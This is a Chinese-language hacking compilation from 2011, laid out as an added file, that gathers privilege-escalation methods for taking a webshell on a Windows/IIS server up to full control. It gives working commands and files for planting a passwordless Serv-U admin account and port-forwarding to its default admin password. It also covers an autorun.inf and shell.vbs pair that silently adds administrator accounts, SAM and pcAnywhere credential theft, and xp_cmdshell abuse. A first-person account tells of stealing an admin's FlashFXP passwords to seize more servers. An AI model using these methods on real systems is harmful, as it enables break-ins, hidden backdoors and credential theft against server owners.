@@ -1,0 +1,322 @@
+号称“最全的WEBSHELL提权大大全2011-12-21 15:25 Wednesday  
+第一，WEBSHELL 权限提升技巧 
+C:\DocumentsandSettings\AllUsers\ApplicationData\Symantec\pcAnywhere\ 
+看能否跳转到这个目录，如果行那就最好了，直接下它的 CIF 文件，破解得到 pcAnywhere 
+密码，登陆 
+c:\ProgramFiles\serv-u\ 
+C:\WINNT\system32\config\ 
+下它的 SAM，破解密码 
+c:\winnt\system32\inetsrv\data\ 
+是 erveryone完全控制，很多时候没作限制，把提升权限的工具上传上去，然后执行 
+c:\perl 
+C:\ProgramFiles\JavaWebStart\ 
+c:\DocumentsandSettings\ 
+C:\DocumentsandSettings\AllUsers\ 
+c:\winnt\system32\inetsrv\data\ 
+c:\ProgramFiles\ 
+c:\ProgramFiles\serv-u\ 
+C:\ProgramFiles\MicrosoftSQLServer\ 
+c:\Temp\ 
+c:\mysql\(如果服务器支持 PHP） 
+c:\PHP(如果服务器支持 PHP） 
+运行"cscriptC:\Inetpub\AdminScripts\adsutil.vbsgetw3svc/inprocessisapiapps"来提升权限 
+还可以用这段代码试提升，好象不是很理想的 
+如果主机设置很变态，可以试下在 c:\DocumentsandSettings\AllUsers\「开始」菜单\程序\启 
+动"写入 bat，vbs 等木马。 
+根目录下隐藏 autorun.inf 
+C:\PROGRAMFILES\KV2004\ 
+D:\PROGRAMFILES\RISING\RAV\ 
+C:\ProgramFiles\Real\RealServer\ 
+Folder.htt 与 desktop.ini 
+将改写的 Folder.htt 与 desktop.ini，还有你的木马或者是 VBS 或者是什么，放到对方管理员 
+最可能浏览的目录下 
+replace替换法捆绑 
+脚本编写一个启动/关机脚本重起 
+删 SAM:(错 
+CAcls 命令 
+FlashFXP 文件夹 Sites.datSites.dat.bakStats.datStats.dat.bak 
+
+第二，Ring 的权限提升 21大法！ 
+以下全部是本人提权时候的总结 很多方法至今没有机会试验也没有成功，但是我是的确 
+看见别人成功过的。本人不才，除了第一种方法自己研究的，其他的都是别人的经验总结。 
+希望对朋友有帮助！ 
+1.radmin连接法 
+条件是你权限够大，对方连防火墙也没有。封装个 radmin上去，运行，开对方端口，然 
+后 radmin上去。本人从来米成功过。，端口到是给对方打开了。
+2.paanywhere 
+C:\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere\ 这里下他的 GIF 
+文件，在本地安装 pcanywhere上去 
+3.SAM 破解 
+C:\WINNT\system32\config\ 下他的 SAM 破解之 
+4.SU密码夺取 
+C:\Documents and Settings\All Users\「开始」菜单\程序\ 
+引用：Serv-U，然后本地查看属性，知道路径后，看能否跳转 
+进去后，如果有权限修改 ServUDaemon.ini，加个用户上去，密码为空 
+[USER=WekweN|1] 
+Password= 
+HomeDir=c:\ 
+TimeOut=600 
+Maintenance=System 
+Access1=C:\|RWAMELCDP 
+Access1=d:\|RWAMELCDP 
+Access1=f:\|RWAMELCDP 
+SKEYvalues= 
+这个用户具有最高权限，然后我们就可以 ftp上去 quote site exec xxx 来提升权限 
+5.c:\winnt\system32\inetsrv\data\ 
+引用：就是这个目录，同样是 erveryone 完全控制，我们所要做的就是把提升权限的工具上 
+传上去， 然后执行 
+6.SU溢出提权 
+这个网上教程 N 多，不详细讲解了 
+7.运行 Csript 
+引用：运行"cscript C:\Inetpub\AdminScripts\adsutil.vbs get w3svc/inprocessisapiapps"来提升权 
+限 用这个 cscript C:\Inetpub\AdminScripts\adsutil.vbs get w3svc/inprocessisapiapps 
+查看有特权的 dll 文件：idq.dll httpext.dll httpodbc.dll ssinc.dll msw3prt.dll 
+再将 asp.dll 加入特权一族 
+asp.dll 是放在 c:\winnt\system32\inetsrv\asp.dll (不同的机子放的位置不一定一样) 
+我们现在加进去 
+cscript adsutil.vbs set /W3SVC/InProcessIsapiApps "C:\WINNT\system32\idq.dll" 
+"C:\WINNT\system32\inetsrv\httpext.dll" "C:\WINNT\system32\inetsrv\httpodbc.dll" 
+"C:\WINNT\system32\inetsrv\ssinc.dll" "C:\WINNT\system32\msw3prt.dll""c:\winnt\system32 
+\inetsrv\asp.dll" 
+可以用 cscript adsutil.vbs get /W3SVC/InProcessIsapiApps 来查看是不是加进去了 
+8.脚本提权 
+c:\Documents and Settings\All Users\「开始」菜单\程序\启动"写入 bat、vbs 
+9.VNC 
+这个是小花的文章 HOHO 
+默认情况下 VNC 密码存放在HKCU\Software\ORL\WinVNC3\Password 
+我们可以用 vncx4 破解它，vncx4 使用很简单，只要在命令行下输入 
+c:\>vncx4 -W 
+然后顺序输入上面的每一个十六进制数据，没输完一个回车一次就行了。
+10.NC 提权 
+给对方来个 NC 但是条件是你要有足够的运行权限 然后把它反弹到自己的电脑上 HOHO 
+OK 了 
+11.社会工程学之 GUEST提权 
+很简单 查看他的拥护 一般来说 看到帐户以后 密码尽量猜 可能用户密码一样 也可能是 
+他 QQ 号 邮箱号 手机号 尽量看看 HOHO 
+12.IPC 空连接 
+如果对方真比较白痴的话 扫他的 IPC 如果运气好还是弱口令 
+13.替换服务 
+这个不用说了吧？个人感觉相当复杂 
+14.autorun .inf 
+autorun=xxx.exe 这个=后面自己写 HOHO 加上只读、系统、隐藏属性 传到哪个盘都可以 
+的不相信他不运行 
+15.desktop.ini 与 Folder.htt 
+引用：首先，我们现在本地建立一个文件夹，名字不重要，进入它，在空白处点右键，选择 
+"自定义 文件夹"（xp好像是不行的）一直下点，默认即可。完成后，你就会看到在此目录 
+下多了两个名为 Folder setting的文件架与 desktop.ini 的文件，（如果你看不到，先取消"隐藏 
+受保护的操作系统文件"） 然后我们在 Folder setting目录下找到 Folder.htt 文件， 记事本打开， 
+在任意地方加入以下代码：然后你将你的后门文件放在 Folder setting 目录下，把此目录与 
+desktop.ini 一起上传到对方 任意一个目录下，就可以了，只要等管理员浏览了此目录，它 
+就执行了我们的后门。 
+16.su覆盖提权 
+本地安装个 su， 将你自己的 ServUDaemon.ini 文件用从他那下载下来的 ServUDaemon.ini 覆 
+盖掉，重起一下 Serv-U，于是你上面的所有配置都与他的一模一样了 
+17.SU转发端口 
+43958 这个是 Serv －U 的本地管理端口。FPIPE.exe 上传他，执行命令： Fpipe–v–l 3333 
+–r 43958 127.0.0.1 意思是将 4444 端口映射到 43958端口上。 然后就可以在本地安装一个 
+Serv-u， 新建一个 服务器， IP 填对方 IP， 帐号为 LocalAdministrator 密码为#1@$ak#.1k;0@p 
+连接上后你就可以管理他的 Serv-u了。 
+18.SQL帐户密码泄露 
+如果对方开了 MSSQL 服务器，我们就可以通过用 SQL 连接器加管理员帐号（可以从他的 
+连接数据库的 ASP 文件中看到），因为 MSSQL是默认的 SYSTEM 权限。 
+引用：对方没有删除 xp_cmdshell 方法：使用 Sqlexec.exe，在 host 一栏中填入对方 IP，User 
+与 Pass 中填入你所得到的用户名与密码。format 选择 xp_cmdshell"%s"即可。然后点击 
+connect，连接上后就可 以在 CMD 一栏中输入你想要的 CMD 命令了 
+19.asp.dll 
+引用：因为asp.dll 是放在 c:\winnt\system32\inetsrv\asp.dll (不同的机子放的位置不一定相同 
+) 我们现在加进去 
+cscript adsutil.vbs set /W3SVC/InProcessIsapiApps "C:\WINNT\system32\idq.dll" 
+"C:\WINNT\system32\inetsrv\httpext.dll" "C:\WINNT\system32\inetsrv\httpodbc.dll" 
+"C:\WINNT\system32\inetsrv\ssinc.dll" "C:\WINNT\system32\msw3prt.dll""c:\winnt\system32 
+\inetsrv\asp.dll" 
+好了,现在你可以用 cscript adsutil.vbs get /W3SVC/InProcessIsapiApps 来查看是不是加进去 
+了,注意,用法中的 get 和 set,一个是查看一个是设置.还有就是你运行上面的你要到
+C:\Inetpub\AdminScripts>这个目录下. 
+那么如果你是一个管理员,你的机子被人用这招把 asp 提升为 system 权限,那么,这时,防的方 
+法就是把asp.dll T出特权一族,也就是用 set 这个命令,覆盖掉刚才的那些东东. 
+20.Magic Winmail 
+前提是你要有个 webshell 引用： http://www.eviloctal.com/forum/read.phptid=3587 这里去看吧 
+21.DBO…… 
+其实 提升权限的方式很多的 就看大家怎么利用了 HOHO 加油吧 将服务器控制到底！ 
+感谢 noangel 
+
+第三，WEBSHELL 权限提升 
+动网上传漏洞，相信大家拿下不少肉鸡吧，但是都是WEBSHELL，不能拿到系统权限，要 
+如何拿到系统权限呢？这正是我们这次要讨论的内容 
+OK，进入我的WEBSHELL 
+啊哈，不错，双 CPU，速度应该跟的上，不拿下你我怎么甘心啊 
+输入密码，进入到里面看看，有什么好东西没有，翻了下，好像也没有什么特别的东西，看 
+看能不能进到其他的盘符，点了下 C 盘，不错不错，可以进去，这样提升就大有希望了 
+一 serv－u提升 
+OK，看看他的 PROGRAME 里面有些什么程序，哦，有 SERV-U，记得有次看到 SERV-U 
+有默认的用户名和密码，但是监听的端口是 43958，而且是只有本地才能访问的，但是我们 
+有端口转发工具的啊，不怕。先看看他的 SERV-U的版本是多少， 
+telnet XXX.XXX.XXX.XXX 21 
+显示竟然是 3.0 的，唉，不得不说这个管理员真的不称职。后来完毕后扫描了下，也只有 
+FTP 的洞没有补。既然是这样，我们就开始我们的提升权限了 
+上传 FPIPE，端口转发工具。 
+在运行 CMD 命令里输入 d:\\wwwroot\\fpipe.exe -v -l 81 -r 43958 127.0.0.1 意思是把本机的 
+43598 端口转发到 81端口。然后打开我们自己机子上的 SERV-U，点 Serv－U服务器，点菜 
+单栏上的的服务器， 点新建服务器， 然后输入 IP， 输入端口， 记得端口是刚刚我们转发的 81 
+端口。服务名称随便你喜欢，怎么样都行。然后是用户名：LocalAdministrator 密码： 
+#l@$ak#.lk;0@P (密码都是字母) 
+确定，然后点刚刚建的服务器，然后就可以看到已有的用户，自己新建一个用户，把所有权 
+限加上。也不锁定根目录 
+接下来就是登陆了，登陆 FTP 一定要在 CMD 下登陆， 
+进入后一般命令和DOS 一样，添加用户的时候 
+ftp>quote site exec net.exe user hk pass /add 
+ftp>quote site exec net.exe localgroup administrators hk/add 
+如果对方开了 3389 的话，就不用我教你怎么做了，没开的话，新建立 IPC 连接，在上传木 
+马或者是开启 3389 的工具 
+二 auto.ini 加 SHELL.VBS 
+autorun.inf 
+[autorun] 
+open=shell.vbs 
+shell.vbs 
+dim wsh 
+set wsh=createObject("WScript.Shell")
+wsh.run "net user guest /active:yes",0 
+wsh.run "net user guest 520ls",0 
+wsh.run "net localgroup administrators guest /add",0 
+wsh.run "net user hkbme 520ls /add",0 
+wsh.run "net localgroup administrators hkbme /add",0 
+wsh.run "cmd.exe /c del autorun.inf",0 
+wsh.run "cmd.exe /c del shell.vbs",0 
+但是这样要可以访问到对方的根目录。将这两个文件放到对方硬盘的根目录下。当然你也可 
+以直接执行木马程序，还要一个木马程序，但是语句就和最后两句一样，通过 CMD 执行木 
+马程序 
+三 Folder.htt 与 desktop.ini 
+将改写的 Folder.htt 与 desktop.ini，还有你的木马或者是 VBS 或者是什么，放到对方管理员 
+最可能浏览的目录下，觉得一个不够，可以多放几个 
+Folder.htt 添加代码， 但是后门和这两个文件必须要放到一块， 有点问题， 可以结合启动 VBS， 
+运行结束后，删除上传的后门.就是 CODEBASE="shell.vbs".shell 写法如上 
+四，replace替换法 
+替换正在执行的文件。用这个几乎可以马上得到权限，但是我没有做过试验，可以试下，将 
+对方正在执行的文件替换为和它文件名一样的，捆绑了木马的。为什么不直接替换木马呢？ 
+如果替换的是关键程序，那不是就直接挂了？所以还是捆绑好点 
+格式 
+REPLACE [drive1:][path1]filename [drive2:][path2] [/A] 
+[/R] [/W] 
+REPLACE [drive1:][path1]filename [drive2:][path2] 
+[/R] [/S] [/W] 
+[drive1:][path1]filename 指定源文件。 
+[drive2:][path2] 指定要替换文件的 
+目录。 
+/A 把新文件加入目标目录。不能和 
+/S 或 /U 命令行开关搭配使用。 
+/P 替换文件或加入源文件之前会先提示您 
+进行确认。 
+/R 替换只读文件以及未受保护的 
+文件。 
+/S 替换目标目录中所有子目录的文件。 
+不能与 /A 命令选项 
+搭配使用。 
+/W 等您插入磁盘以后再运行。 
+/U 只会替换或更新比源文件日期早的文件。 
+不能与 /A 命令行开关搭配使用 
+这个命令没有试验过，看能不能替换不能访问的文件夹下的文件，大家可以试验下 
+五 脚本 
+编写一个启动/关机脚本配置文件 scripts.ini，这个文件名是固定的，不能改变。内容如下： 
+[Startup] 
+0CmdLine=a.bat
+0Parameters= 
+将文件 scripts.ini 保存到"C:\\winnt\\system32\\GroupPolicy\\Machine\\Scripts" 
+A.BAT的内容可以是 NET USER yonghu mima 
+也可以是NET USER ADMINistrator XXX 
+这样可以恢复你想要得任意用户名的密码，也可以自己增加新的用户，但是要依赖重启，还 
+有就是对 SYSTEM32 有写的权限 
+六 SAM 
+如果可以访问对方的 SYSTEM32 的话，删除对方的 SAM 文件，等他重启以后就是 ADMIN 
+用户密码为空 
+突然又有了想法，可以用 REPLACE 命令替换的吗，可以把你的 SAM 文件提取出来，上传 
+到他的任意目录下，然后替换。不过不知道如果对 SYSTEM32 没有权限访问的话，能不能 
+实现替换 
+-------------------------------------------------------------------------------- 
+第四，使用 FlashFXP来提升权限 
+最近各位一定得到不少肉鸡吧:)，从前段时间的动网的 upfile 漏洞， 动力文章系统最 
+新漏洞到 first see发现的动网 sql 版本的一个超级大漏洞。有人一定忙的不易乐乎，大家的 
+方法也不过是使用一下 asp 脚本的后门罢了。至于提 升权限的问题呵呵，很少有人能作一 
+口气完成。关键还是在提升权限上做个问题上，不少服务器设置的很 BT，你的 asp 木马可 
+能都用不了，还那里来的提升啊。我们得到 webshell 也就是个低级别的用户的权限，各种 
+提升权限方法是可谓五花八门啊，如何提升就看你自己的妙招了。 
+其一，如果服务器上有装了 pcanywhere 服务端，管理员为了便于管理也给了我们方便，到 
+系统盘的 Documents and Settings/All Users/Application Data/Symantec/pcAnywhere/中下载 
+*.cif本地破解就使用 pcanywhere连接就 ok了。 
+其二，如果对方有 Serv-U大家不要骂我啊，通过修改 ServUDaemon.ini 和 fpipe这软件提升 
+权限应该是不成问 题吧。 
+其三，通过替换系统服务来提升。 
+其四，查找 conn和 config这类型的文件看能否得到 sa 或者 mysql 的相关密码，可能会有所 
+收获等等。 
+本人在一次无聊的入侵过程中发现了这个方法，使用Flashfxp也能提升权限，但是成功率高 
+不高就看你自己的运气了:) 
+本人 www.xxx.com 通过 bbs 得到了一个 webshell，放了个小马(现在海阳的名气太大了偶不 
+敢放)，而且已经将一段代码插入了N 个文件中，够黑吧。提升权限没时间做。在我放假回 
+家后，一看我晕bbs 升级到动网 sp2 了我放的小马也被 K 了，人家的 BBS 是 access 版本的。 
+郁闷啊！突然想起我将一个页面插入了 asp 的后门，看看还有没有希望了。输 
+www.xxx.com/xx.aspid =1 好家伙，还在！高兴 ing 
+于是上传了一个 asp的脚本的后门，怎么提升权限呢 
+在这个网站的主机上游荡了N 分钟， 在 C:\\ Program Files 下发现了 FlashFXP 文件夹(跟我一 
+样使用这个软件自己心里暗想)图 2， 于是就打了了 Sites. dat 这个文件(编辑)这是什么东西密 
+码和用户名，而且密码是加了密的。 
+如果我把这些文件 copy回本地也就是我的计算机中，替换我本地的相应文件会怎么样呢 
+于是我就将 Sites.dat Sites.dat.bak Stats.dat Stats.dat.bak几个文件下载到我的计算机中替换了 
+我电脑中 flashfxp 文件夹的相应文件。打开 flashfxp 在站点中打开站点管理器一项。乖 乖 
+发财了 
+对方管理员通过 flashfxp连接的各个站点都在图 3，点击连接。通过了于是我们又有了一堆
+肉鸡，我们有 ftp权限。上传脚本 木马~ 呵呵。 
+说了半天这提升权限的事情一点没讲啊 
+不要急，大家看看对方管理员的这站点管理器，有用户名和密码，密码是星号的。可惜啊！ 
+又想起了在 Sites.dat 中也显示了密码和用户名，而且密码是加密的。 
+现在的星号密码会不会也是加了密的看看就行了呗。 
+怎么看 菜鸟了吧 手头有个不错的查看星号的软件，就是 xp 星号密码查看器，通过查看跟 
+Sites.dat 中加密了密码做比较。看图 4 和图 5 的比较 很显然在站点管理器中查看到的密码 
+是明文显示的。发财了吧 
+下一步就是使用 xp 星号密码查看器这个软件来提取密码和用户名。看者这些复杂的密码， 
+还真有点怀念当年玩 sniff的时光。呵呵 
+密码为:b69ujkq6 hyndai790 s584p*fv4-c+ 98cq3jk4 3-8*ef./2z5+ 
+用户名:bn7865t nilei75 qm/-g57+3kn qm/-g57+3kn 5.e*82/+69 
+(上述部分密码和用户名已经作了必要的修改) 
+这么多的信息，按社会工程学的概念来说，没有管理员的密码。打死我也不相信。最终我得 
+到了这个网站管理员的密码从这堆东西中找到 的。 
+我想这个问题应该反馈到 flashfxp官方，让他们在下个版本中修正这个漏洞或者说是错误。 
+经过后来测试只要把含有密码和用户名的 Sites.dat 文件替换到本地相应的文件就可以在本 
+地还原对方管理员的各个站点的密码。 希望大家在入侵的时候遇到 fla shfxp的时候能想到这 
+个方法，至少也可以得到一堆新的肉鸡。不防试试希望能给大家渗透带来帮助。 
+-------------------------------------------------------------------------------- 
+第五，将 asp权限提到最高 
+by: cnqing from:http://friend.91eb.com 
+本来是要写个提权asp木马的，可惜时间不是太多功底也不是太深。先把原理方法告诉大家 
+好了。简单说说，说的太麻烦没有必要。懂了就行。 
+原理： 
+asp文件的教本解释是由asp.dll 运行的。由 dllhost.exe启动的。身分是 IWAN_NAME。若是 
+把 asp.dll 放到 inprocesslsapiapps 中那它就是由 inetifo.exe直接启动。身份是 system 
+方法： 
+第一步。 
+得到 inprocesslsapiapps 内容，用命令"cscript C:\\Inetpub\\AdminScripts\\adsutil.vbs get 
+w3svc/inprocessisapiapps"。将得到的一组 dll 复制下来。 
+第二步 
+写一个 bat 内容为"cscript C:\\Inetpub\\AdminScripts\\ adsutil vbs set w3svc/inprpocessisapiapps 
+"C:\\Inetpub\\AdminScripts\\asp.dll" ····· 
+省略号为复制下的内容。中间用空格分开不要带回车符 
+最后运行这个 bat 就行了。 
+例如： 
+我用"cscript C:\\Inetpub\\AdminScripts\\adsutil.vbs get w3svc/inprocessisapiapps"得到 
+"c:\\winnt\\system32\\inetsrv\\httpext.dll" 
+"c:\\winnt\\system32\\inetsrv\\httpodbc.dll" 
+"C:\\WINNT\\system32\\inetsrv\\ssinc.dll" 
+"C:\\WINNT\\System32\\msw3prt.dll" 
+"C:\\Program Files\\Common Files\\Microsoft Shared\\Web Server 
+Extensions\\isapi\\_vti_aut\\author.dll"
+"C:\\Program Files\\Common Files\\Microsoft Shared\\Web Server 
+Extensions\\isapi\\_vti_adm\\admin.dll" 
+"C:\\Program Files\\Common Files\\Microsoft Shared\\Web Server Extensions\\isapi\\shtml.dll" 
+那么你的 bat 就应该是： 
+cscript C:\\Inetpub\\AdminScripts\\adsutil vbs set w3svc/inprpocessisapiapps 
+"C:\\Inetpub\\AdminScripts\\asp.dll" "c:\\winnt\\system32\\inetsrv\\httpext.dll" 
+"c:\\winnt\\system32\\inetsrv\\httpodbc.dll" "C:\\WINNT\\system32\\inetsrv\\ssinc.dll" 
+"C:\\WINNT\\System32\\msw3prt.dll" "C:\\Program Files\\Common Files\\Microsoft 
+Shared\\Web Server Extensions\\isapi\\_vti_aut\\author.dll" "C:\\Program Files\\Common 
+Files\\Microsoft Shared\\Web Server Extensions\\isapi\\_vti_adm\\admin.dll" "C:\\Program 
+Files\\Common Files\\Microsoft Shared\\Web Server Extensions\\isapi\\shtml.dll" 
+已测试成功！！ 
+ 
